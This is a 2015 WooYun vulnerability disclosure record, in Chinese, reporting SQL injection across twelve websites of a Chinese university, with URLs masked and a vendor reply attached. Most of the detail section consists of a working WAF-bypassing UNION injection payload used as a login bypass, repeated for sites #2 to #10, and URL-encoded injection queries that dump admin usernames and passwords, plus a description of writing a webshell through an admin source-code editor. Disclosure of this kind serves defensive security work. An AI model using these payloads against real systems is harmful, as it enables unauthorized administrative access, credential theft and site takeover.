{"id": 70305, "wybug_id": "wooyun-2015-0135400", "wybug_title": "国际关系学院12个站点注入打包，可拿shell", "wybug_corp": "CCERT教育网应急响应组", "wybug_author": "路人甲", "wybug_date": "2015-08-20 10:25", "wybug_open_date": "2015-10-08 08:34", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(CCERT教育网应急响应组)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射", "数据库账户权限过高", "注射技巧", "后台被猜解"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-09-03：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-13：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-23：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-08：\t细节向公众公开  简要描述： 国际关系学院12个站点注入打包，绝大部分可GetShell，共影响20+个站点。 详细说明：  \n\n看完介绍，吓得我想看看有多安全。发现该学院12个站点存在注入漏洞，可进后台，getshell，影响面达20+个子站。   漏洞证明：  #1 http://**.**.**.**/发现注入点\nhttp://**.**.**.**/search.php --data=\"skey=1'\"\n\n\n用sqlmap注入，的账户密码后台地址如下，同样存在注入漏洞，尝试构造万能账户，发现有waf，失败\nhttp://**.**.**.**/admin/\n注入点可确定，位于\nselect * from `xxx_user` where `username`='xxxx' limit 0, 1;\n后台逻辑不当，有源代码管理界面，直接写shell\nhttp://**.**.**.**/admin/aiweb_php_file.php\n在下列文件发现80sec的简单waf\n/cls/cls_db_mysql.php\n根据该waf，尝试构造以下万能账户，成功登陆后台，应该是当前CMS的通杀神器，先记住\n用户名: 'and@`'`/*!50000union*/select@^1,1,'admin','21232f297a57a5a743894a0e4a801fc3','超级管理员','**.**.**.**',null,null,null,null,null,null,'2015-08-19 15:13:52',null,1,18,'**.**.**.**',1,2,null,null, null from dual where ''='密码: admin\n开始用万能账户拿其它分站#2 http://**.**.**.**/admin/login.phppayload\n用户名: 'and@`'`/*!50000union*/select@^1,1,'admin','21232f297a57a5a743894a0e4a801fc3','超级管理员','**.**.**.**',null,null,null,null,null,null,'2015-08-19 15:13:52',null,1,18,'**.**.**.**',1,2,null,null, null from dual where ''='密码: admin\n\n\n源代码编辑页面，拿shell\nhttp://**.**.**.**/admin/aiweb_php_file.php\n#3 http://**.**.**.**/admin/login.phppayload\n用户名: 'and@`'`/*!50000union*/select@^1,1,'admin','21232f297a57a5a743894a0e4a801fc3','超级管理员','**.**.**.**',null,null,null,null,null,null,'2015-08-19 15:13:52',null,1,18,'**.**.**.**',1,2 from dual where ''='密码: admin\n\n\n源代码编辑页面，可拿shell\nhttp://**.**.**.**/admin/aiweb_php_file.php\n都是一样的CMS，下边就不上图了#4 http://**.**.**.**/admin/login.phppayload\n用户名: 'and@`'`/*!50000union*/select@^1,1,'admin','21232f297a57a5a743894a0e4a801fc3','超级管理员','**.**.**.**',null,null,null,null,null,null,'2015-08-19 15:13:52',null,1,18,'**.**.**.**',1,2,null,null, null from dual where ''='密码: admin\n#5 http://**.**.**.**/admin/login.phppayload\n用户名: 'and@`'`/*!50000union*/select@^1,1,'admin','21232f297a57a5a743894a0e4a801fc3','超级管理员','**.**.**.**',null,null,null,null,null,null,'2015-08-19 15:13:52',null,1,18,'**.**.**.**',1,2 from dual where ''='密码: admin\n#6 http://**.**.**.**/admin/login.phppayload\n用户名: 'and@`'`/*!50000union*/select@^1,1,'admin','21232f297a57a5a743894a0e4a801fc3','超级管理员','**.**.**.**',null,null,null,null,null,null,'2015-08-19 15:13:52',null,1,18,'**.**.**.**',1,2 from dual where ''='密码: admin\n#7 http://**.**.**.**/admin/login.phppayload\n用户名: 'and@`'`/*!50000union*/select@^1,1,'admin','21232f297a57a5a743894a0e4a801fc3','超级管理员','**.**.**.**',null,null,null,null,null,null,'2015-08-19 15:13:52',null,1,18,'**.**.**.**',1,2,null,null, null from dual where ''='密码: admin\n#8 http://**.**.**.**/admin/login.phppayload\n用户名: 'and@`'`/*!50000union*/select@^1,1,'admin','21232f297a57a5a743894a0e4a801fc3','超级管理员','**.**.**.**',null,null,null,null,null,null,'2015-08-19 15:13:52',null,1,18,'**.**.**.**',1,2,null,null, null from dual where ''='密码: admin\n#9 http://**.**.**.**/admin/login.phppayload\n用户名: 'and@`'`/*!50000union*/select@^1,1,'admin','21232f297a57a5a743894a0e4a801fc3','超级管理员','**.**.**.**',null,null,null,null,null,null,'2015-08-19 15:13:52',null,1,18,'**.**.**.**',1,2,null,null, null from dual where ''='密码: admin\n#10 http://**.**.**.**/admin/login.phppayload\n用户名: 'and@`'`/*!50000union*/select@^1,1,'admin','21232f297a57a5a743894a0e4a801fc3','超级管理员','**.**.**.**',null,null,null,null,null,null,'2015-08-19 15:13:52',null,1,18,'**.**.**.**',1,2,null,null, null from dual where ''='密码: admin\n#11 http://**.**.**.**/admin/login.php访问\nhttp://**.**.**.**/view.php?cid=6&tid=0%20and@`%27`/*!50000union*/select@^1,2,3,username,password,6%20from%20ilinju_user%20where%20%27%27=%27%27\n的用户名密码\nadmin:admin\n#12 http://**.**.**.**/admin/login.php访问\nhttp://**.**.**.**/news.view.php?id=0%20and@`%27`/*!50000union*/select@^1,2,3,iuser,5,6,7,8,9,ipass,11,12,9,9,9%20from%20uir_admin%20where%20%27%27=%27%27\n得后台用户名密码访问\nhttp://**.**.**.**/news.view.php?id=0%20and@`%27`/*!50000union*/select@^1,2,3,iuser,5,6,7,8,9,ipass,11,12,9,9,9%20from%20uir_user_wai%20where%20%27%27=%27%27%20limit%200,1\n得用户密码#受影响的部分站点通过上述漏洞收集的MD5，可登陆以下后台，http://**.**.**.**/admin/http://**.**.**.**/admin/http://**.**.**.**/admin/http://**.**.**.**/admin/(etc ...)   修复方案：  开除开发这套CMS的人。。。。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：6  确认时间：2015-08-24 08:33 厂商回复： 通知处理中 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 6, "Ranks": null}